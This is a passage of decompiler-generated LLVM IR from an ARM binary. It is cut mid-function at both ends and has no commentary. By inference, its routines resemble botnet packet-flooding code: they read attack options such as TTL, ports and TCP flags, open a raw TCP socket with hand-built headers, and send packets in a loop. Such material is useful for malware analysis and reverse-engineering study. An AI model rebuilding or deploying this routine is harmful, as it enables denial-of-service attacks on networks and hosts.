  %v3_d2a4 = add i32 %v2_d2a4, 17
  %v4_d2a4 = inttoptr i32 %v3_d2a4 to i8*
  store i8 %v1_d2a4, i8* %v4_d2a4, align 1
  %v0_d2a8 = load i32, i32* @r5, align 4
  %v4_d2ac = call i32 @function_f1d8(i32 %v0_d2a8, i32 %v0_d294, i32 %v0_d298, i32 %v0_d29c)
  %v5_d2ac = trunc i32 %v4_d2ac to i8
  %v4_d2b030 = udiv i32 %v4_d2ac, 256
  %v1_d2b4 = trunc i32 %v4_d2b030 to i8
  %v2_d2b4 = load i32, i32* @r6, align 4
  %v3_d2b4 = add i32 %v2_d2b4, 17
  %v4_d2b4 = inttoptr i32 %v3_d2b4 to i8*
  store i8 %v1_d2b4, i8* %v4_d2b4, align 1
  %v3_d2b8 = load i32, i32* @r6, align 4
  %v4_d2b8 = add i32 %v3_d2b8, 16
  %v5_d2b8 = inttoptr i32 %v4_d2b8 to i8*
  store i8 %v5_d2ac, i8* %v5_d2b8, align 1
  %v3_d2bc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d2bc, i32* %r3.global-to-local, align 4
  %v0_d2c0 = load i32, i32* @r5, align 4
  %v1_d2c0 = add i32 %v0_d2c0, 20
  %v2_d2c0 = inttoptr i32 %v1_d2c0 to i32*
  %v3_d2c0 = load i32, i32* %v2_d2c0, align 4
  %v3_d2c8 = udiv i32 %v3_d2c0, 65536
  store i32 %v3_d2c8, i32* %r2.global-to-local, align 4
  %v5_d2cc = mul i32 %v3_d2bc, 24
  %v1_d2d0 = load i32, i32* @sb, align 4
  %v2_d2d0 = add i32 %v1_d2d0, %v5_d2cc
  store i32 %v2_d2d0, i32* %ip.global-to-local, align 4
  %v3_d2d428 = udiv i32 %v3_d2c0, 16777216
  %v1_d2d8 = trunc i32 %v3_d2d428 to i8
  %v3_d2d8 = add i32 %v2_d2d0, 3
  %v4_d2d8 = inttoptr i32 %v3_d2d8 to i8*
  store i8 %v1_d2d8, i8* %v4_d2d8, align 1
  %v0_d2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_d2dc = trunc i32 %v0_d2dc to i8
  %v2_d2dc = load i32, i32* %ip.global-to-local, align 4
  %v3_d2dc = add i32 %v2_d2dc, 2
  %v4_d2dc = inttoptr i32 %v3_d2dc to i8*
  store i8 %v1_d2dc, i8* %v4_d2dc, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d2e4 = load i32, i32* @r5, align 4
  store i32 %v0_d2e4, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_d2f4 = load i32, i32* %ip.global-to-local, align 4
  %v4_d2f4 = inttoptr i32 %v0_d2f4 to %sockaddr*
  %v7_d2fc = inttoptr i32 %v0_d2e4 to i32*
  %v9_d2fc = call i32 @sendto(i32 %v3_cee4, i32* %v7_d2fc, i32 %stack_var_-168.0.ph, i32 16384, %sockaddr* %v4_d2f4, i32 16)
  %v3_d300 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d300, i32* %r3.global-to-local, align 4
  %v1_d304 = add i32 %v3_d300, 1
  %v0_d308 = load i32, i32* @fp, align 4
  %v9_d308 = icmp eq i32 %v0_d308, %v1_d304
  store i1 %v9_d308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d304, i32* %stack_var_-40, align 4
  %v7_d310 = icmp sgt i32 %v0_d308, %v1_d304
  br i1 %v7_d310, label %dec_label_pc_d1f4, label %dec_label_pc_d1cc

dec_label_pc_d318:                                ; preds = %dec_label_pc_cef4
  %v1_d31c = call i32 @close(i32 %v3_cee4)
  br label %dec_label_pc_d320

dec_label_pc_d320:                                ; preds = %dec_label_pc_cce0, %dec_label_pc_d318
  %v29_d324 = phi i32 [ %v3_cee4, %dec_label_pc_cce0 ], [ %v1_d31c, %dec_label_pc_d318 ]
  store i32 %v3_cce0, i32* %r4.global-to-local, align 4
  ret i32 %v29_d324

dec_label_pc_d328:                                ; preds = %dec_label_pc_d1f4
  %v1_d328 = add i32 %v2_d1fc, 16
  %v2_d328 = inttoptr i32 %v1_d328 to i32*
  %v3_d328 = load i32, i32* %v2_d328, align 4
  store i32 %v3_d328, i32* %r4.global-to-local, align 4
  %v0_d32c = call i32 @function_10b68()
  %v3_d330 = load i32, i32* %stack_var_-40, align 4
  %v5_d338 = mul i32 %v3_d330, 24
  %v1_d340 = load i32, i32* @sb, align 4
  %v2_d340 = add i32 %v1_d340, %v5_d338
  store i32 %v2_d340, i32* %r1.global-to-local, align 4
  %v1_d344 = and i32 %v3_d328, 65280
  store i32 %v1_d344, i32* %r3.global-to-local, align 4
  %v1_d33c = udiv i32 %v3_d328, 256
  %v3_d348 = and i32 %v1_d33c, 65280
  store i32 %v3_d348, i32* %r2.global-to-local, align 4
  %v3_d34c = mul i32 %v3_d328, 16777216
  store i32 %v3_d34c, i32* %ip.global-to-local, align 4
  %v1_d350 = add i32 %v2_d340, 20
  %v2_d350 = inttoptr i32 %v1_d350 to i8*
  %v3_d350 = load i8, i8* %v2_d350, align 1
  %v4_d350 = zext i8 %v3_d350 to i32
  %v4_d354 = mul nuw nsw i32 %v1_d344, 256
  %v5_d354 = or i32 %v4_d354, %v3_d34c
  store i32 %v5_d354, i32* %ip.global-to-local, align 4
  %v2_d35c = call i32 @llvm.bswap.i32(i32 %v3_d328)
  %v7_d360 = lshr i32 %v0_d32c, %v4_d350
  %v8_d360 = add i32 %v7_d360, %v2_d35c
  store i32 %v8_d360, i32* %r2.global-to-local, align 4
  %v2_d37c = call i32 @llvm.bswap.i32(i32 %v8_d360)
  store i32 %v2_d37c, i32* %r3.global-to-local, align 4
  store i32 %v6_ced0, i32* %r1.global-to-local, align 4
  store i1 %v8_d384, i1* %cpsr_z.global-to-local, align 1
  %v1_d388 = load i32, i32* @r5, align 4
  %v2_d388 = add i32 %v1_d388, 16
  %v3_d388 = inttoptr i32 %v2_d388 to i32*
  store i32 %v2_d37c, i32* %v3_d388, align 4
  br i1 %v3_d384, label %dec_label_pc_d390, label %dec_label_pc_d224

dec_label_pc_d390:                                ; preds = %dec_label_pc_d328, %dec_label_pc_d218
  %v0_d390 = call i32 @function_10b68()
  store i32 %v3_cf2c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d3a0, i1* %cpsr_z.global-to-local, align 1
  %v1_d3a4 = load i32, i32* @r5, align 4
  %v2_d3a4 = add i32 %v1_d3a4, 12
  %v3_d3a4 = inttoptr i32 %v2_d3a4 to i32*
  store i32 %v0_d390, i32* %v3_d3a4, align 4
  br i1 %v3_d3a0, label %dec_label_pc_d3ac, label %dec_label_pc_d390.dec_label_pc_d238_crit_edge

dec_label_pc_d390.dec_label_pc_d238_crit_edge:    ; preds = %dec_label_pc_d390
  %v1_d23c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d238

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d390, %dec_label_pc_d224
  %v0_d3ac = call i32 @function_10b68()
  %v1_d3ac = trunc i32 %v0_d3ac to i8
  %v4_d3b031 = udiv i32 %v0_d3ac, 256
  %v1_d3b4 = trunc i32 %v4_d3b031 to i8
  %v2_d3b4 = load i32, i32* @r5, align 4
  %v3_d3b4 = add i32 %v2_d3b4, 5
  %v4_d3b4 = inttoptr i32 %v3_d3b4 to i8*
  store i8 %v1_d3b4, i8* %v4_d3b4, align 1
  store i32 %v3_cf30, i32* %r3.global-to-local, align 4
  %v1_d3bc = load i32, i32* @r4, align 4
  %v9_d3bc = icmp eq i32 %v3_cf30, %v1_d3bc
  store i1 %v9_d3bc, i1* %cpsr_z.global-to-local, align 1
  %v3_d3c0 = load i32, i32* @r5, align 4
  %v4_d3c0 = add i32 %v3_d3c0, 4
  %v5_d3c0 = inttoptr i32 %v4_d3c0 to i8*
  store i8 %v1_d3ac, i8* %v5_d3c0, align 1
  %v0_d3c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3c4, label %dec_label_pc_d3c8, label %dec_label_pc_d3ac.dec_label_pc_d244_crit_edge

dec_label_pc_d3ac.dec_label_pc_d244_crit_edge:    ; preds = %dec_label_pc_d3ac
  %v1_d248.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d3ac, %dec_label_pc_d238
  %v0_d3c8 = call i32 @function_10b68()
  %v1_d3c8 = trunc i32 %v0_d3c8 to i8
  store i32 %v3_cf34, i32* %ip.global-to-local, align 4
  %v4_d3d0 = sdiv i32 %v0_d3c8, 256
  store i32 %v4_d3d0, i32* %r3.global-to-local, align 4
  %v1_d3d4 = load i32, i32* @r4, align 4
  %v9_d3d4 = icmp eq i32 %v3_cf34, %v1_d3d4
  store i1 %v9_d3d4, i1* %cpsr_z.global-to-local, align 1
  %v3_d3d8 = load i32, i32* @r5, align 4
  %v4_d3d8 = add i32 %v3_d3d8, 20
  %v5_d3d8 = inttoptr i32 %v4_d3d8 to i8*
  store i8 %v1_d3c8, i8* %v5_d3d8, align 1
  %v0_d3dc = load i32, i32* %r3.global-to-local, align 4
  %v1_d3dc = trunc i32 %v0_d3dc to i8
  %v2_d3dc = load i32, i32* @r6, align 4
  %v3_d3dc = add i32 %v2_d3dc, 1
  %v4_d3dc = inttoptr i32 %v3_d3dc to i8*
  store i8 %v1_d3dc, i8* %v4_d3dc, align 1
  %v0_d3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3e0, label %dec_label_pc_d3e4, label %dec_label_pc_d3c8.dec_label_pc_d250_crit_edge

dec_label_pc_d3c8.dec_label_pc_d250_crit_edge:    ; preds = %dec_label_pc_d3c8
  %v1_d254.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d250

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3c8, %dec_label_pc_d244
  %v0_d3e4 = call i32 @function_10b68()
  %v1_d3e4 = trunc i32 %v0_d3e4 to i8
  store i32 %v5_cdd0, i32* %r1.global-to-local, align 4
  %v4_d3ec = sdiv i32 %v0_d3e4, 256
  store i32 %v4_d3ec, i32* %r3.global-to-local, align 4
  %v1_d3f0 = load i32, i32* @r4, align 4
  %v9_d3f0 = icmp eq i32 %v5_cdd0, %v1_d3f0
  store i1 %v9_d3f0, i1* %cpsr_z.global-to-local, align 1
  %v1_d3f4 = trunc i32 %v4_d3ec to i8
  %v2_d3f4 = load i32, i32* @r6, align 4
  %v3_d3f4 = add i32 %v2_d3f4, 3
  %v4_d3f4 = inttoptr i32 %v3_d3f4 to i8*
  store i8 %v1_d3f4, i8* %v4_d3f4, align 1
  %v3_d3f8 = load i32, i32* @r6, align 4
  %v4_d3f8 = add i32 %v3_d3f8, 2
  %v5_d3f8 = inttoptr i32 %v4_d3f8 to i8*
  store i8 %v1_d3e4, i8* %v5_d3f8, align 1
  %v0_d3fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3fc, label %dec_label_pc_d400, label %dec_label_pc_d3e4.dec_label_pc_d25c_crit_edge

dec_label_pc_d3e4.dec_label_pc_d25c_crit_edge:    ; preds = %dec_label_pc_d3e4
  %v1_d260.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d25c

dec_label_pc_d400:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d250
  %v0_d400 = call i32 @function_10b68()
  store i32 %v6_cdec, i32* %r2.global-to-local, align 4
  %v1_d408 = load i32, i32* @r4, align 4
  %v9_d408 = icmp eq i32 %v6_cdec, %v1_d408
  store i1 %v9_d408, i1* %cpsr_z.global-to-local, align 1
  %v1_d40c = load i32, i32* @r6, align 4
  %v2_d40c = add i32 %v1_d40c, 4
  %v3_d40c = inttoptr i32 %v2_d40c to i32*
  store i32 %v0_d400, i32* %v3_d40c, align 4
  br i1 %v9_d408, label %dec_label_pc_d414, label %dec_label_pc_d268

dec_label_pc_d414:                                ; preds = %dec_label_pc_d400, %dec_label_pc_d25c
  %v0_d414 = call i32 @function_10b68()
  store i32 %v1_cebc, i32* %r3.global-to-local, align 4
  store i1 %v2_d41c, i1* %cpsr_z.global-to-local, align 1
  %v1_d420 = load i32, i32* @r6, align 4
  %v2_d420 = add i32 %v1_d420, 8
  %v3_d420 = inttoptr i32 %v2_d420 to i32*
  store i32 %v0_d414, i32* %v3_d420, align 4
  br i1 %v2_d41c, label %dec_label_pc_d274, label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d268, %dec_label_pc_d414
  %v0_d428 = load i32, i32* @r5, align 4
  %v1_d428 = add i32 %v0_d428, 40
  store i32 %v6_ce94, i32* @r1, align 4
  %v1_d430 = inttoptr i32 %v1_d428 to i8*
  %v2_d430 = call i32 @function_10d44(i8* %v1_d430)
  br label %dec_label_pc_d274

dec_label_pc_d438:                                ; preds = %dec_label_pc_cf1c
  store i32 %v6_ce94, i32* %r3.global-to-local, align 4
  %v1_d440 = add i32 %v6_ce94, 40
  store i32 %v1_d440, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d1cc.preheader

; uselistorder directives
  uselistorder i32 %v1_d440, { 1, 0 }
  uselistorder i32 %v4_d3ec, { 1, 0 }
  uselistorder i32 %v2_d37c, { 1, 0 }
  uselistorder i32 %v3_d34c, { 1, 0 }
  uselistorder i32 %v3_d328, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_d308, { 1, 2, 0 }
  uselistorder i32 %v1_d304, { 2, 0, 3, 1 }
  uselistorder i32 %v0_d294, { 1, 0, 2 }
  uselistorder i32 %v0_d1d8, { 2, 0, 1 }
  uselistorder i32 %v0_d1cc, { 1, 0 }
  uselistorder i1 %v2_d41c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d3a0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d1b4, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d018, { 1, 0 }
  uselistorder i32 %v1_cfe0, { 1, 0 }
  uselistorder i32 %v1_cfdc, { 1, 0 }
  uselistorder i32 %v1_cfd8, { 1, 0 }
  uselistorder i32 %v1_cfb4, { 1, 0 }
  uselistorder i32 %v1_cfb0, { 1, 0 }
  uselistorder i32 %v1_cfac, { 1, 0 }
  uselistorder i32 %v1_cfa0, { 1, 0 }
  uselistorder i32 %v1_cf7c, { 1, 0 }
  uselistorder i32 %v1_cf6c, { 1, 0 }
  uselistorder i32 %v1_cf58, { 3, 0, 2, 1 }
  uselistorder i32 %v0_cf38, { 1, 0, 2 }
  uselistorder i32 %v3_cf2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_cf20, { 3, 0, 1, 2 }
  uselistorder i32 %v0_cf1c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_cf14, { 1, 0 }
  uselistorder i1 %v7_cee8, { 1, 0 }
  uselistorder i32 %v3_cee4, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_ced0, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_cebc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_ce94, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_cdec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_cdd0, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_cd80, { 1, 0 }
  uselistorder i32 %v6_cd18, { 1, 0 }
  uselistorder i32 %v4_cd00, { 0, 3, 1, 2 }
  uselistorder i32 %v1_cce4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 39, 40, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 10, 11, 13, 12, 14, 15, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 8, 9, 10 }
  uselistorder label %dec_label_pc_d428, { 1, 0 }
  uselistorder label %dec_label_pc_d320, { 1, 0 }
  uselistorder label %dec_label_pc_d274, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1cc.preheader, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d454(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d454:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_d454 = load i32, i32* @r4, align 4
  %v6_d454 = load i32, i32* @r5, align 4
  %v9_d454 = load i32, i32* @r6, align 4
  %v12_d454 = load i32, i32* @r7, align 4
  %v1_d458 = urem i32 %arg1, 256
  store i32 %v1_d458, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d458, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d470 = urem i32 %arg3, 256
  store i32 %v1_d470, i32* @r4, align 4
  %v2_d474 = call i32* @calloc(i32 %v1_d458, i32 4)
  %v3_d474 = ptrtoint i32* %v2_d474 to i32
  %v0_d478 = load i32, i32* @r5, align 4
  store i32 %v0_d478, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v3_d474, i32* %fp.global-to-local, align 4
  %v0_d488 = load i32, i32* @r4, align 4
  store i32 %v0_d488, i32* %r0.global-to-local, align 4
  %v4_d48c = inttoptr i32 %v0_d478 to i32*
  %v5_d48c = call i32 @function_b240(i32 %v0_d488, i32* %v4_d48c, i32 2, i32 0)
  %v1_d498 = urem i32 %v5_d48c, 256
  store i32 %v1_d498, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d4a4 = load i32, i32* @r5, align 4
  store i32 %v0_d4a4, i32* %r1.global-to-local, align 4
  %v0_d4a8 = load i32, i32* @r4, align 4
  store i32 %v0_d4a8, i32* %r0.global-to-local, align 4
  %v5_d4ac = trunc i32 %v5_d48c to i8
  %v6_d4b0 = inttoptr i32 %v0_d4a4 to i32*
  %v7_d4b0 = call i32 @function_b240(i32 %v0_d4a8, i32* %v6_d4b0, i32 3, i32 65535)
  %v0_d4b4 = load i32, i32* @r5, align 4
  store i32 %v0_d4b4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @r4, align 4
  store i32 %v0_d4c4, i32* %r0.global-to-local, align 4
  %v5_d4c8 = inttoptr i32 %v0_d4b4 to i32*
  %v6_d4c8 = call i32 @function_b240(i32 %v0_d4c4, i32* %v5_d4c8, i32 4, i32 64)
  %v1_d4d0 = urem i32 %v6_d4c8, 256
  store i32 %v1_d4d0, i32* %ip.global-to-local, align 4
  %v0_d4d4 = load i32, i32* @r5, align 4
  store i32 %v0_d4d4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  store i32 %v0_d4e0, i32* %r0.global-to-local, align 4
  %v6_d4e8 = inttoptr i32 %v0_d4d4 to i32*
  %v7_d4e8 = call i32 @function_b240(i32 %v0_d4e0, i32* %v6_d4e8, i32 5, i32 1)
  %v1_d4f4 = urem i32 %v7_d4e8, 256
  store i32 %v1_d4f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d500 = load i32, i32* @r5, align 4
  store i32 %v0_d500, i32* %r1.global-to-local, align 4
  %v0_d504 = load i32, i32* @r4, align 4
  store i32 %v0_d504, i32* %r0.global-to-local, align 4
  %v5_d50c = inttoptr i32 %v0_d500 to i32*
  %v6_d50c = call i32 @function_b240(i32 %v0_d504, i32* %v5_d50c, i32 6, i32 65535)
  %v0_d514 = load i32, i32* @r5, align 4
  store i32 %v0_d514, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_d50c, i32* @r7, align 4
  %v0_d524 = load i32, i32* @r4, align 4
  store i32 %v0_d524, i32* %r0.global-to-local, align 4
  %v4_d528 = inttoptr i32 %v0_d514 to i32*
  %v5_d528 = call i32 @function_b240(i32 %v0_d524, i32* %v4_d528, i32 7, i32 65535)
  %v0_d530 = load i32, i32* @r5, align 4
  store i32 %v0_d530, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_d528, i32* @r6, align 4
  %v0_d540 = load i32, i32* @r4, align 4
  store i32 %v0_d540, i32* %r0.global-to-local, align 4
  %v4_d544 = inttoptr i32 %v0_d530 to i32*
  %v5_d544 = call i32 @function_b240(i32 %v0_d540, i32* %v4_d544, i32 17, i32 65535)
  %v0_d548 = load i32, i32* @r5, align 4
  store i32 %v0_d548, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d558 = load i32, i32* @r4, align 4
  store i32 %v0_d558, i32* %r0.global-to-local, align 4
  %v5_d55c = inttoptr i32 %v0_d548 to i32*
  %v6_d55c = call i32 @function_b240(i32 %v0_d558, i32* %v5_d55c, i32 18, i32 0)
  %v0_d560 = load i32, i32* @r5, align 4
  store i32 %v0_d560, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d570 = load i32, i32* @r4, align 4
  store i32 %v0_d570, i32* %r0.global-to-local, align 4
  %v5_d574 = inttoptr i32 %v0_d560 to i32*
  %v6_d574 = call i32 @function_b240(i32 %v0_d570, i32* %v5_d574, i32 11, i32 0)
  %v0_d578 = load i32, i32* @r5, align 4
  store i32 %v0_d578, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d588 = load i32, i32* @r4, align 4
  store i32 %v0_d588, i32* %r0.global-to-local, align 4
  %v5_d58c = inttoptr i32 %v0_d578 to i32*
  %v6_d58c = call i32 @function_b240(i32 %v0_d588, i32* %v5_d58c, i32 12, i32 0)
  %v0_d590 = load i32, i32* @r5, align 4
  store i32 %v0_d590, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5a0 = load i32, i32* @r4, align 4
  store i32 %v0_d5a0, i32* %r0.global-to-local, align 4
  %v5_d5a4 = inttoptr i32 %v0_d590 to i32*
  %v6_d5a4 = call i32 @function_b240(i32 %v0_d5a0, i32* %v5_d5a4, i32 13, i32 0)
  %v0_d5a8 = load i32, i32* @r5, align 4
  store i32 %v0_d5a8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5b8 = load i32, i32* @r4, align 4
  store i32 %v0_d5b8, i32* %r0.global-to-local, align 4
  %v5_d5bc = inttoptr i32 %v0_d5a8 to i32*
  %v6_d5bc = call i32 @function_b240(i32 %v0_d5b8, i32* %v5_d5bc, i32 14, i32 0)
  %v0_d5c0 = load i32, i32* @r5, align 4
  store i32 %v0_d5c0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d5d0 = load i32, i32* @r4, align 4
  store i32 %v0_d5d0, i32* %r0.global-to-local, align 4
  %v5_d5d4 = inttoptr i32 %v0_d5c0 to i32*
  %v6_d5d4 = call i32 @function_b240(i32 %v0_d5d0, i32* %v5_d5d4, i32 15, i32 1)
  %v0_d5d8 = load i32, i32* @r5, align 4
  store i32 %v0_d5d8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d5e8 = load i32, i32* @r4, align 4
  store i32 %v0_d5e8, i32* %r0.global-to-local, align 4
  %v5_d5ec = inttoptr i32 %v0_d5d8 to i32*
  %v6_d5ec = call i32 @function_b240(i32 %v0_d5e8, i32* %v5_d5ec, i32 16, i32 0)
  %v2_d5f8 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_d5f8, i32* %r3.global-to-local, align 4
  %v0_d5fc = load i32, i32* @r5, align 4
  store i32 %v0_d5fc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d604 = load i32, i32* @r4, align 4
  store i32 %v0_d604, i32* %r0.global-to-local, align 4
  %v5_d608 = inttoptr i32 %v0_d5fc to i32*
  %v6_d608 = call i32 @function_b1d4(i32 %v0_d604, i32* %v5_d608, i32 25, i32 %v2_d5f8, i32 %v6_d5ec)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d61c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_d61c, i32* %r0.global-to-local, align 4
  %v7_d620 = icmp eq i32 %v3_d61c, -1
  store i1 %v7_d620, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d61c, i32* %sb.global-to-local, align 4
  br i1 %v7_d620, label %dec_label_pc_db8c, label %dec_label_pc_d62c

dec_label_pc_d62c:                                ; preds = %dec_label_pc_d454
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d634 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d634, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d648 = call i32 @setsockopt(i32 0, i32 3, i32 %v6_d634, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d648, i32* %r0.global-to-local, align 4
  %v7_d64c = icmp eq i32 %v6_d648, -1
  store i1 %v7_d64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d64c, label %dec_label_pc_db84, label %dec_label_pc_d654

dec_label_pc_d654:                                ; preds = %dec_label_pc_d62c
  store i32 0, i32* %stack_var_-40, align 4
  %v0_d668 = load i32, i32* @r7, align 4
  %v3_d668 = mul i32 %v0_d668, 65536
  store i32 %v3_d668, i32* %r4.global-to-local, align 4
  %v0_d66c = load i32, i32* @r6, align 4
  %v3_d66c = mul i32 %v0_d66c, 65536
  store i32 %v3_d66c, i32* %r5.global-to-local, align 4
  %v3_d670 = urem i32 %v7_d4b0, 65536
  store i32 %v3_d670, i32* %r3.global-to-local, align 4
  %v3_d674 = urem i32 %v0_d668, 65536
  store i32 %v3_d674, i32* %ip.global-to-local, align 4
  %v3_d678 = urem i32 %v0_d66c, 65536
  store i32 %v3_d678, i32* %r0.global-to-local, align 4
  %v1_d67c = urem i32 %v6_d574, 256
  store i32 %v1_d67c, i32* %r2.global-to-local, align 4
  %v0_d680 = load i32, i32* @sl, align 4
  %v2_d680 = icmp eq i32 %v0_d680, 0
  store i1 %v2_d680, i1* %cpsr_z.global-to-local, align 1
  %tmp70 = icmp slt i32 %v0_d680, 1
  br i1 %tmp70, label %dec_label_pc_d930, label %dec_label_pc_d698

dec_label_pc_d698:                                ; preds = %dec_label_pc_d654
  %v1_d6a8 = urem i32 %v0_d668, 256
  %v1_d6b0 = urem i32 %v7_d4b0, 256
  %v1_d6b4 = urem i32 %v0_d66c, 256
  %tmp71 = mul i32 %v5_d544, 256
  %v3_d6bc = mul nuw nsw i32 %v1_d6b4, 256
  %v1_d6c0 = and i32 %tmp71, 65280
  %tmp72 = udiv i32 %v0_d66c, 256
  %v4_d6c4 = urem i32 %tmp72, 256
  %v5_d6c4 = or i32 %v4_d6c4, %v3_d6bc
  store i32 %v5_d6c4, i32* %r6.global-to-local, align 4
